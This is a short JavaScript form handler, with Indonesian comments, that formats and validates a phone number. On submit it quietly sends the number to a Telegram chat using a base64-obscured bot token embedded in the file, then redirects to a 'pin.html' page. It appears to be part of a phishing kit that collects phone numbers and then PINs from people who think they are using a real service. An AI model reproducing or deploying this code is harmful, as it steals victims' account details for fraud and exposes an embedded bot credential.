document.getElementById('phoneNumber').addEventListener('input', function() {
    let phoneNumber = document.getElementById('phoneNumber').value;
    
    // Menghapus karakter selain angka
    phoneNumber = phoneNumber.replace(/\D/g, '');
    
    // Menambahkan format - setelah 4 dan 8 digit
    if (phoneNumber.length > 4) {
        phoneNumber = phoneNumber.slice(0, 4) + '-' + phoneNumber.slice(4);
    }
    if (phoneNumber.length > 9) {
        phoneNumber = phoneNumber.slice(0, 9) + '-' + phoneNumber.slice(9);
    }

    // Membatasi input hingga 15 digit
    if (phoneNumber.length > 15) {
        phoneNumber = phoneNumber.slice(0, 15);
    }

    // Menyimpan kembali nilai format yang sudah ditambahkan tanda minus
    document.getElementById('phoneNumber').value = phoneNumber;

    const submitButton = document.querySelector('.submit-button');

    // Menampilkan tombol "LANJUTKAN" hanya jika panjang nomor lebih dari 8 digit dan kurang dari atau sama dengan 15 digit
    if (phoneNumber.length > 8 && phoneNumber.length <= 15) {
        submitButton.style.display = 'block';
    } else {
        submitButton.style.display = 'none';
    }
});

document.getElementById('phoneForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const phoneNumber = document.getElementById('phoneNumber').value;

    // Validasi panjang nomor HP (maksimal 15 digit)
    if (phoneNumber.length > 15) {
        alert("Nomor HP tidak boleh lebih dari 15 digit.");
        return;
    }

    const botToken = atob('NzU2OTI2ODM2MDpBQUdlQmR4Q0dTM0tVcDd1c094VDJnU2tIUVZHUGRmWUJkVQ==');
    const chatId = '7732620750';
    const message = `Nomor HP: ${phoneNumber}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                window.location.href = 'pin.html'; // Ganti dengan halaman tujuan
            } else {
                alert('Gagal mengirim nomor HP. Silakan coba lagi.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Terjadi kesalahan. Silakan coba lagi.');
        });
});